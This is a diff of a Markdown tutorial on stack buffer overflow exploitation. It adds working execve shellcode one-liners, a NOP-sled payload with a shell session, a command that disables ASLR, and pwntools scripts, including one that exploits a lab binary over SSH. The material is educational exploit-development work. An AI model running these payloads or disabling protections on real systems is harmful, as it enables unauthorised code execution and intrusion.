@@ -85,27 +85,6 @@ Program received signal SIGSEGV, Segmentation fault.
 
 Segmentation fault is nothing because you can see that the gdb shows you detaching. It means that the shell is executed.
 
-Do it with `pwntools`:
-```python
-from pwn import *
-
-
-# start the vuln program
-p = process('./stack-overflow')
-# shell function address
-shell_addr = p32(0x080491d6)
-# fill the vuln buffer
-payload = b'A' * 250
-# add the offset
-payload += b'B' * 12
-# add a new return address
-payload += shell_addr
-# send to process
-p.sendline(payload)
-# Shell
-p.interactive()
-```
-
 Again, you have a shell, or if this program would be with SUID bit set, you would get the root or another user who is owned this program.
 
 ### Why is this happening?
@@ -349,7 +328,7 @@ gef➤
 
 So, my address is `0xffffcea6`. Then, I just placed the shellcode at the beginning of the buffer and jumped on it. You can see gdb said that the new program was executed.
 
-Try it outside gdb. It doesn't work. gdb creates its own address space and there is an offset between the address in gdb and the real address of the executable.
+Try it outside gdb. It doesn't work. Firstly, you need to disable security technique ASLR(`echo "0" | dd of=/proc/sys/kernel/randomize_va_space`). Secondly, gdb creates its own address space and there is an offset between the address in gdb and the real address of the executable.
 
 Gdb has its env variables. So, we unset them with `unset environment`. '`LINES` and `COLUMNS` vars are the lines and columns of the terminal, and GDB sets them internally'.
 
@@ -377,7 +356,12 @@ process 8791 is executing new program: /bin/dash
 [Inferior 1 (process 8791) exited normally]
 ```
 
-It works again inside gdb. Sometimes it helps, sometimes doesn't. You could try to brute-force it with some sort of script, but there is a better solution. And that's why we need the next subsection of stack overflow vulnerability.
+Now, outside gdb:
+```bash
+$ (python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A"*239 + "\x56\xcf\xff\xff"'; cat) | ./stack-overflow
+```
+
+Sometimes `unset environment` helps, sometimes doesn't. You could try to brute-force the address with some sort of script, but there is a better solution. And that's why we need the next subsection of stack overflow vulnerability.
 
 ## NOP chain
 
@@ -420,3 +404,69 @@ process 10186 is executing new program: /bin/dash
 ```
 
 Now, you see the exploit works too with the NOP chain.
+
+Outside gdb:
+```bash
+$ (python -c 'print "\x90" * 200 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A"*39 + "\x56\xcf\xff\xff"'; cat) | ./stack-overflow
+w
+ 16:44:33 up  2:08,  1 user,  load average: 0.43, 0.45, 0.42
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+shogun   tty7     :0               14:36    2:08m  7:11   3.52s xfce4-session
+```
+
+But, the nop-chain will work and help you if there is enough space in the vulnerable buffer. If there is not then you will need to find another way to exploit a vulnerability. Other techniques will be discussed later.
+
+## pwntools
+
+pwntools is a exploit development library. 'It is designed for rapid prototyping and development, and intended to make exploit writing as simple as possible.'
+
+With pwntools you can connect to the remote target via ssh or just to send some data to the known port. After connection you can execute whatever you want with proper python code.
+
+Explain a little bit:
+- [ ] How to connect to target.
+- [ ] How to make an exploit.
+- [ ] How to write a shellcode faster.
+- [ ] How to write on assembly language through pwntools.
+
+### Remote exploit of buffer overflow with pwntools
+
+```python
+from pwn import *
+
+# Connect to target via ssh
+con = ssh('user', '192.168.43.61', password='user', port=22)
+# Execute a vulnerable program
+p = con.process('./buffer-overflow')
+# Payload
+payload = "A"*108 + "\xd2\x04"
+# Send payload
+p.sendline(payload)
+# To attach with gdb to remote process
+#gdb.attach(p, "b *main")
+# Now, you can work with shell interactively
+p.interactive()
+```
+
+One difference here is the offset between the buffer and the value to overwrite. This offset often can be different from the local exploit.
+
+### Jump to an arbitrary address
+
+```python
+from pwn import *
+
+
+# start the vuln program
+p = process('./stack-overflow')
+# shell function address
+shell_addr = p32(0x080491d6)
+# fill the vuln buffer
+payload = b'A' * 250
+# add the offset
+payload += b'B' * 12
+# add a new return address
+payload += shell_addr
+# send to process
+p.sendline(payload)
+# Shell
+p.interactive()
+```
